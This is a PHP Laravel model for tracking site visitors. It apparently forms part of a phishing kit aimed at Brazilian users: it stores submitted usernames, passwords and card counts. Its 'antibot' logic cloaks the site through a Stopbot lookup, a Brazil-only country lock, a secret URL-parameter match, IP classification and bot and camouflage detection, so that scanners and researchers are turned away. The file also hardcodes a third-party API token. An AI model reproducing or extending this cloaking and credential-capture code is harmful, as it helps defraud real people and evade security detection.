<?php

namespace App\Models;

use App\Class\Browser;
use App\Class\Ipify;
use App\Class\Stopbot\StopbotResponse;
use App\Enums\AntibotStatus;
use App\Enums\ParameterStatus;
use App\Enums\UserType;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Log;
use Throwable;

class Visitor extends Model {
    protected $fillable = [
        'card_count',
        'is_finished',
        'is_blocked',
        'user_type',
        'ip_address',
        'parameter_status',
        'stopbot_response',
        'isp',
        'browser',
        'city',
        'state',
        'country',
        'user',
        'pass',
        'user_agent',
        'first_page',
        'last_page',
    ];

    protected $appends = [
        'visitor_details',
        'antibot_status',
        'page_finished',
    ];

    public function getPageFinishedAttribute(): bool
    {
        return (bool)Cache::get("page_finished_$this->user");
    }

    public function setPageFinished(): void
    {
        Cache::put("page_finished_$this->user", true);
    }

    /**
     * Retrieve the current instance based on the request's IP address.
     *
     * @return static
     * @noinspection PhpMissingReturnTypeInspection
     */
    public static function current()
    {
        return self::whereIpAddress(GetIP())->first();
    }

    public static function lookup(?string $ip = null): ?static
    {
        $ip ??= GetIP();
        $browser = new Browser(getallheaders());
        $parameterStatus = ParameterStatus::get();
        $endpoint = "https://api.findip.net/$ip/?token=76e13cdf895e411ca235d5d9e072f05b";

        // Defaults for when neither geo source resolves the IP. Returning null
        // here used to leave no visitor row, which made InitializeVisitor throw
        // and the visitor see a 500 — an unidentified visitor should be denied
        // by Allowance instead of crashing.
        $userType = UserType::Undetected;
        $isp = '';
        $city = '';
        $state = '';
        $country = '';

        try {
            $response = Http::connectTimeout(2)->timeout(2)->get($endpoint)->throw();
            $userType = UserType::tryFrom($response->json('traits.user_type')) ?? UserType::Undetected;
            $isp = $response->json('traits.isp');
            $city = $response->json('city.names.en');
            $state = $response->json('subdivisions.0.names.en');
            $country = $response->json('country.names.en');
        } catch (Throwable $t) {
            Log::alert($t);
            try {
                $ipify = Ipify::free()->lookup($ip);

                $userType = match ($ipify['as']['type'] ?? '') {
                    "Cable/DSL/ISP",
                    "NSP" => UserType::Residential,
                    "Enterprise" => UserType::Business,

                    "Content",
                    "Route Server",
                    "Educational/Research" => UserType::Hosting,

                    default => UserType::Undetected,
                };
                $isp = $ipify['isp'] ?? '';
                $city = $ipify['location']['city'] ?? '';
                $state = $ipify['location']['region'] ?? '';
                $country = $ipify['location']['country'] ?? '';
            } catch (Throwable $t) {
                Log::alert($t);
                // Keep the defaults: the row is still created so the visitor is
                // handled by Allowance rather than blowing up in InitializeVisitor.
            }
        }

        return self::updateOrCreate(['ip_address' => $ip], [
            'card_count' => 0,
            'ip_address' => $ip,
            'is_finished' => false,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'browser' => $browser,
            'isp' => $isp,
            'city' => $city,
            'state' => $state,
            'country' => $country,
            'parameter_status' => $parameterStatus,
            'user_type' => $userType,
            'stopbot_response' => Settings::me()->stopbotLookup(),
            'first_page' => request()->getRequestUri(),
            'last_page' => request()->getRequestUri(),
        ]);
    }

    public function toArray(): array
    {
        return [
            'id' => $this->id,
            'ip_address' => $this->ip_address,
            'user_agent' => $this->user_agent,
            'browser' => $this->browser->toString(),
            'isp' => $this->isp,
            'city' => $this->city,
            'state' => $this->state,
            'country' => $this->country,
            'user_type' => $this->user_type->name,
            'antibot_status' => $this->antibot_status->name,
            'parameter_status' => $this->parameter_status->name,
            'created_at' => $this->created_at->toString(),
            'updated_at' => $this->updated_at->toString(),
            'card_count' => $this->card_count,
            'is_finished' => $this->is_finished,
            'stopbot_response' => $this->stopbot_response,
            'first_page' => $this->first_page,
            'last_page' => $this->last_page,
            'desc' => $this->visitor_details,
        ];
    }

    public function as_markdown_footer(string $tab = ''): string
    {
        return Str::of("$tab- Browser: $this->browser\n")
            ->append("$tab- Geo: {$this->geoAsString()}\n")
            ->append("$tab- ISP: $this->isp\n")
            ->append("$tab- User Type: {$this->user_type->name}\n")
            ->append("$tab- Antibot Status: {$this->antibot_status->name}\n")
            ->append("$tab- Parameter Status: {$this->parameter_status->name}\n")
            ->append("$tab- User Agent: $this->user_agent\n")
            ->value();
    }

    public function geoAsString(): string
    {
        return Str::of('')
            ->append($this->city ? "$this->city, " : '')
            ->append($this->state ? "$this->state, " : '')
            ->append($this->country ?: '')
            ->append("| $this->ip_address ($this->isp)")
            ->value();
    }

    /** @noinspection PhpUnused */

    public function getVisitorDetailsAttribute(): string
    {
        $evaluation = $this->evaluateAntibot();
        $reason = $evaluation['reason'] !== null
            ? self::antibotReasonLabels()[$evaluation['reason']]
            : 'None';

        return "Status: {$evaluation['status']->name} | Reason: $reason | User Type: {$this->user_type->name} | Parameter Status: {$this->parameter_status->name} | Stopbot: {$this->stopbotDetail()} | Browser: $this->browser";
    }

    /**
     * Primary reason a visitor was denied, as a short admin-facing label.
     * Null when the visitor is allowed.
     */
    public function getAntibotReasonAttribute(): ?string
    {
        $reason = $this->evaluateAntibot()['reason'];

        return $reason !== null ? self::antibotReasonLabels()[$reason] : null;
    }

    /** @return array<int, array{id: string, label: string, passed: bool, detail: string}> */
    public function getAntibotChecksAttribute(): array
    {
        return $this->evaluateAntibot()['checks'];
    }

    public function getAntibotStatusAttribute(): AntibotStatus
    {
        return $this->evaluateAntibot()['status'];
    }

    /**
     * Evaluate every antibot rule once and derive status, the primary reason
     * (first failing check, by precedence) and the full checklist.
     *
     * Checks are derived from live visitor attributes plus current settings, so
     * the result is deliberately not persisted — storing it would go stale when
     * `lock_brazil` / the parameter setting change.
     *
     * @return array{status: AntibotStatus, reason: ?string, checks: array<int, array{id: string, label: string, passed: bool, detail: string}>}
     */
    public function evaluateAntibot(): array
    {
        $lockBrazil = Settings::me()->lock_brazil;

        $checks = [
            [
                'id' => 'blocked',
                'label' => 'Manual IP block',
                'passed' => !$this->is_blocked,
                'detail' => $this->is_blocked ? 'Blocked from the admin panel' : 'Not blocked',
            ],
            [
                'id' => 'country',
                'label' => 'Brazil lock',
                'passed' => !$lockBrazil || strtolower($this->country) === 'br' || strtolower($this->country) === 'brazil',
                'detail' => $lockBrazil
                    ? ($this->country !== '' ? "Country: $this->country" : 'Country unknown')
                    : 'Lock disabled',
            ],
            [
                'id' => 'user_type',
                'label' => 'IP classification',
                'passed' => $this->user_type !== UserType::Undetected,
                'detail' => "Detected as: {$this->user_type->name}",
            ],
            [
                'id' => 'parameter',
                'label' => 'Parameter',
                'passed' => $this->parameter_status->matched(),
                'detail' => $this->parameter_status->matched() ? 'Matched' : 'Unmatched',
            ],
            [
                'id' => 'browser',
                'label' => 'Browser',
                'passed' => !$this->browser->unsafe(),
                'detail' => $this->browserDetail(),
            ],
            [
                'id' => 'stopbot',
                'label' => 'Stopbot',
                'passed' => !$this->stopbot_response?->unsafe(),
                'detail' => $this->stopbotDetail(),
            ],
        ];

        $failed = array_values(array_filter($checks, static fn (array $check) => !$check['passed']));
        $firstFailure = $failed[0]['id'] ?? null;

        $status = match (true) {
            $firstFailure === null => AntibotStatus::Allowed,
            // An unclassified IP is its own outcome: deny, but label it Unknown
            // rather than claiming a specific threat was detected. If any other
            // check also failed, the result is a plain Disallowed.
            $firstFailure === 'user_type' && count($failed) === 1 => AntibotStatus::Unknown,
            default => AntibotStatus::Disallowed,
        };

        return ['status' => $status, 'reason' => $firstFailure, 'checks' => $checks];
    }

    /** Short admin-facing labels keyed by check id. */
    private static function antibotReasonLabels(): array
    {
        return [
            'blocked' => 'Manual IP block',
            'country' => 'Outside Brazil',
            'user_type' => 'IP not classified',
            'parameter' => 'Parameter unmatched',
            'browser' => 'Unsafe browser',
            'stopbot' => 'Blocked by Stopbot',
        ];
    }

    private function browserDetail(): string
    {
        $browser = $this->browser;
        if (!$browser->unsafe()) {
            return (string)$browser;
        }

        $reasons = [];
        if ($browser->camouflage) {
            $reasons[] = 'camouflage detected';
        }
        if ($browser->isType('bot')) {
            $reasons[] = 'bot';
        }
        if (!$browser->isType('desktop') && !$browser->isType('mobile')) {
            $reasons[] = 'unknown device type';
        }

        return ($reasons !== [] ? implode(', ', $reasons) . ' — ' : '') . $browser;
    }

    private function stopbotDetail(): string
    {
        if ($this->stopbot_response === null) {
            return 'Not configured';
        }

        return $this->stopbot_response->unsafe()
            ? 'Blocked: ' . ($this->stopbot_response->status->Desc ?: 'no detail')
            : 'Passed: ' . ($this->stopbot_response->status->Desc ?: 'no detail');
    }

    public function isAllowed(): bool
    {
        $this->last_page = request()->getRequestUri();
        $this->save();
        return $this->antibot_status === AntibotStatus::Allowed;
    }

    protected function casts(): array
    {
        return [
            'browser' => Browser::class,
            'user_type' => UserType::class,
            'antibot_status' => AntibotStatus::class,
            'parameter_status' => ParameterStatus::class,
            'stopbot_response' => StopbotResponse::class,
            'created_at' => 'datetime',
            'updated_at' => 'datetime',
            'is_finished' => 'boolean',
            'is_blocked' => 'boolean',
            'card_count' => 'integer',
        ];
    }
}
